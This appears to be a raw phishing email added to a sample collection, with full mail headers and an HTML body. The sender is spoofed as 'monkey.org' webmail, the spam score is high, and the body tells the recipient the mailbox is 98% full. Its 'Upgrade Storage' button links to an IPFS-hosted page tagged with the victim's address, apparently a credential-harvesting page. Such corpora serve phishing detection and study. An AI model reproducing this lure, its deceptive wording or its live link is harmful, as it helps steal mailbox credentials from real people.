@@ -1,0 +1,145 @@
+Return-Path: webmail@support.org
+Delivered-To: jose@monkey.org
+X-FDA: 83259455202.24.F92FD7A
+Received: from sloppymove.aeza.network (unknown [85.239.147.203])
+	by imf01.b.hostedemail.com (Postfix) with ESMTP id 21F591A0004
+	for <jose@monkey.org>; Tue, 25 Mar 2025 08:51:39 +0000 (UTC)
+Authentication-Results: imf01.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=none (imf01.b.hostedemail.com: domain of webmail@support.org has no SPF
+ policy when checking 85.239.147.203) smtp.mailfrom=webmail@support.org
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1742892700;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=yvIuJbWfvFT3WgDXk3Bd30+na4GAqIBIOvH9UWDYRFs=;
+	b=dAuAfG3IUIyrh0jMqZfSDGY9Yui7VDv4QvaIp+FhsCClFAW5wgEmAeTTiQU0/SvAUPlkyC
+	DE4rekAxhqMM6IEauPWcWDZ4QASkfjf+KVuu8RemqKnGxGVCJqp+nc2nRfNjETO5wCh89W
+	FpbXw+GfhceU3aBzOdATsvt5g8wg6LM=
+ARC-Authentication-Results: i=1;
+	imf01.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=none (imf01.b.hostedemail.com: domain of webmail@support.org has no SPF
+ policy when checking 85.239.147.203) smtp.mailfrom=webmail@support.org
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1742892700; a=rsa-sha256;
+	cv=none;
+	b=ZjsQAYhnoaTlsR/w37ajUb4fFXZR01ho59hvyhDutmxfppR4RIwQ9dWFxEfI+Ddsbs8BoR
+	q1LONvSdba6TDB2lXMnjbLmGVhZr/zlCo/rtsLYyXTODDA0Ga6uSPAMh+E2NMraSjYkwTl
+	ENa5a6MDYKp7PKjsVQ5487uqVBxEFdg=
+Received: from support.org (localhost [127.0.0.1])
+	by sloppymove.aeza.network (Postfix) with ESMTP id 8893864C48E
+	for <jose@monkey.org>; Tue, 25 Mar 2025 08:28:25 +0000 (UTC)
+From: monkey.org <webmail@support.org>
+To: jose@monkey.org
+Subject: Attention!! jose your mailbox storage is full
+Date: 25 Mar 2025 04:28:24 -0400
+Message-ID: <20250325042823.BB1883163BC2D724@support.org>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspam-User: 
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: 21F591A0004
+X-Stat-Signature: ten35hxbhzbtm4f8gnpisyddbbtn81yh
+X-Spam-Status: Yes, score=13.70
+X-HE-Tag: 1742892699-558431
+X-HE-Meta: 
+ U2FsdGVkX1/UjPexC3Y58tSyNji0Q25h+3RUI5X5GJgiVvF25DdFBniB1wGSzxGOWqEHCfoqfyEpGehojN4ehW23TyLwpLqzXNoqbvhC3F1dKAxDIpythTWvPPod/jzMCVE8X4TRGGOb3tsM0tni/JzHm7RmRIdpQi9Yg4am5QmpznAiUrcFyYupT18g0SkuTg01YgEBLwTvnx0YKwPAcOW/KsUqt5R+C1m/m/dgrdB6haYFFNkgI/ElFjPevt7sQLvi86DXjtaEMIIKy0GuaI7183Er6It+dFVSVdG6SdH1oxuXRCtm5FeTdZoI42EUYY2FX2asOnfvZQ2m+UIP8s69KHjtpRyO3wDWex/ZmNeBsFTXbmY+ytKMWJJ+vU655y9bp7lPiTnkP+KWderlEge/12EwcaGWCNDrOalH4rVRRAj3/0cnPRQio2VIfuJUSDpaeZBWZNTZF1Hrv4IsBGXP8Nod0Ae+cNki5PxXsBBxkz2wMkWlzCumfRhnHM+/vhMJob61LRcDQx8KwbBUrsajw27hBWaZMWH6HgotY9XnESBX3Hjt2IIenGWGXWysLKmAjx/rnhFpfsQsr+QJaCbw79MU6lhAJ6t2ltrq6IbT/15DJDvn01w6/XIirJb8qTKc4/Fbm2hAK5vM1gHjwswy3MMdvn+pgv3FXJmJfFiWNL26RLxrBINwr0yyBkYdTSYaU2lqoWAcTm/o3nim6Uu70YLG9cTtiOvSQMPsg4ir0JpDA6M+vNMlbbw3QL7aTuELjAD5FRJAXRf9Ig8BfI1w3/pQTst2xbR1tqX72rTjpm3O1b1fkKPnppQBZnl0AEiakeIyUMoqzvcuLbPJJz8BpVf6PrRGoz71IJ0UfLoQS/7qaqJtbioGehq6+5DM9vKUg5jMR9GcP91wipHRVJu8N6F/+Bsvwy+O/qGltWktK3zcOoCYLUrA+oIx+ZOzlC/58ioPoN8tCYtLn/SU1Mvuvft
+ 0Ykjf/+fL+jHiX3bDI0SqxH1lruMlHnKyA6Su5sB6xAwcR1DWZRWGJLhlV3MJCBO1TeAznKcxDM5D5FeaBmLykvoL/Fij7zjlGg5Udpx/aIBlQJHDoaHUtOanL3enuNLoZFcQp8Q9jYVWN69xNnJl8PEu0xI7OBAk/1UNf5GAG39fZjrhWYYTVXHr0DkpxL0cmJEwL14I8K+GJ4qlopw7JJRw4zHr4bbLvkAl57rNDBT67ykrYrEJx5nc5xeU26HDj7m7N5n92C0H0kLf8ot4SptzfaAX7xbY1mDMO9ecgn46NbI95fBc1du61XR6g6gDrgNEBerCz1ZyJ0sgzgx+lIVgInt5NBkgSvQWHucAkQz/VC1nA33tRCCh/qb8k/PBE6CX7Iyxl9YNvdQ0v5SaffpTqEAecqiei0RNcJA4WHc2rIUvgD9xwgnBqDFviLmYdEisrtDHA77AfVS0cDM7Hb40XZMFUgyCxw57VsCRS9Tp4EMaW0tz3l0MQpMIllMnRlF48NV2nHsc1io+gbnxDUyfo47yW12a2EaDXFRuAr0IEbq5qYOOwHtVKYcqR1EkybppSzNmGcJzJoSosgpWTNNyHU3dA6IhfXNdgae4s5akfvVHkGhStBO3rQsj76D0CN5xuHh2vlsx5okO8lKWXhZVWYYFb+HdpaVoM1srqYzciA0v+tuWptlBLZ7ec80f/BZU
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 105
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+
+<html><head><title></title>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent=
+: 0px; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; f=
+ont-size: small; font-style: normal; font-weight: 400; margin-top: 0px; wor=
+d-spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; wi=
+dows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
+-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
+n-style: initial; text-decoration-color: initial;">
+<font style=3D"vertical-align: inherit; box-sizing: border-box;"><span styl=
+e=3D"vertical-align: inherit; box-sizing: border-box;"><span style=3D"font-=
+weight: bolder; box-sizing: border-box;"><span style=3D"color: rgb(238, 97,=
+ 17); font-family: Arial; font-size: 33px;">&nbsp; Webmail</span><br><br><b=
+r>Attention User:</span></span></font><span style=3D"vertical-align: inheri=
+t; box-sizing: border-box;">&nbsp;jose@monkey.org</span></p>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
+size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
+-space: normal; outline-width: medium; outline-style: none; box-sizing: bor=
+der-box; orphans: 2; widows: 2; font-variant-ligatures: normal; font-varian=
+t-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: =
+initial; text-decoration-style: initial;=20
+text-decoration-color: initial;"><span style=3D"font-size: xx-large; box-si=
+zing: border-box;"><font style=3D"vertical-align: inherit; outline-width: m=
+edium; outline-style: none; box-sizing: border-box;">Your Mailbox storage i=
+s 98% Full</font></span></div>
+<div style=3D"border: 1px solid rgb(187, 187, 187); border-image: none; wid=
+th: 700px; height: 8px; color: rgb(34, 34, 34); text-transform: none; text-=
+indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica, sans-se=
+rif; font-size: 1px; font-style: normal; font-weight: 400; margin-top: 10px=
+; margin-bottom: 8px; word-spacing: 0px; white-space: normal; outline-width=
+: medium; outline-style: none; box-sizing: border-box; orphans: 2; widows: =
+2; font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial;"><div style=3D"border: 1px solid rgb(236, 101, 51); border-image: =
+none; width: 621px; height: 6px; padding-top: 0px; outline-width: medium; o=
+utline-style: none; box-sizing: border-box; background-color: rgb(236, 101,=
+ 51);"></div></div>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; margin-top: 0px; word-spac=
+ing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widows: =
+2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-=
+stroke-width: 0px; text-decoration-thickness: initial; text-decoration-styl=
+e: initial; text-decoration-color: initial;">
+<span style=3D"color: rgb(159, 159, 159); box-sizing: border-box;"><font st=
+yle=3D"vertical-align: inherit; outline-width: medium; outline-style: none;=
+ box-sizing: border-box;"><span style=3D"outline-width: medium; outline-sty=
+le: none; box-sizing: border-box;"><em style=3D"box-sizing: border-box;">Yo=
+u are currently using 4853.4 MB of 5000 MB available</em><br style=3D"box-s=
+izing: border-box;"><br style=3D"box-sizing: border-box;"><br style=3D"box-=
+sizing: border-box;"><br style=3D"box-sizing: border-box;">
+<a style=3D'padding: 10px 24px; border-radius: 5px; color: rgb(255, 255, 25=
+5); line-height: 16px; font-family: "Google Sans", Roboto, RobotoDraft, Hel=
+vetica, Arial, sans-serif; font-size: 14px; display: inline-block; min-widt=
+h: 90px; box-sizing: border-box; background-color: rgb(65, 132, 243); text-=
+decoration-line: none;' href=3D"https://ipfs.io/ipfs/bafybeihfup37yw23zn5tn=
+pkdl5vb6hy26oyx7i25qgbjecbl6iieuakefq/pages.html/#jose@monkey.org" target=
+=3D"_blank" rel=3D"noreferrer">Upgrade Storage</a></span></font>
+</span><br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: borde=
+r-box;">&nbsp;</p>
+<p style=3D'color: rgb(51, 51, 51); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: "Lucida Grande", Verdana, Arial, Helv=
+etica, sans-serif; font-size: 11px; font-style: normal; font-weight: 400; w=
+ord-spacing: 0px; white-space: normal; orphans: 2; widows: 2; font-variant-=
+ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0p=
+x; text-decoration-thickness: initial; text-decoration-style: initial; text=
+-decoration-color: initial;'>
+<span style=3D"color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-=
+serif; font-size: small; box-sizing: border-box;">&copy;&nbsp;</span><span =
+style=3D"color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-serif;=
+ font-size: small; box-sizing: border-box;">monkey.org&nbsp;</span><span st=
+yle=3D"color: rgb(44, 54, 58); font-family: Roboto, sans-serif; font-size: =
+medium;">&nbsp;</span><span>&nbsp;</span>
+<span style=3D"color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-=
+serif; font-size: small; box-sizing: border-box;">2025</span><span style=3D=
+"color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-serif; font-si=
+ze: small;">&nbsp;<br><br><em><font color=3D"#000000" face=3D"Times New Rom=
+an" size=3D"3">This is an automatic email notification. Do not reply!</font=
+></em></span></p></body></html>
+
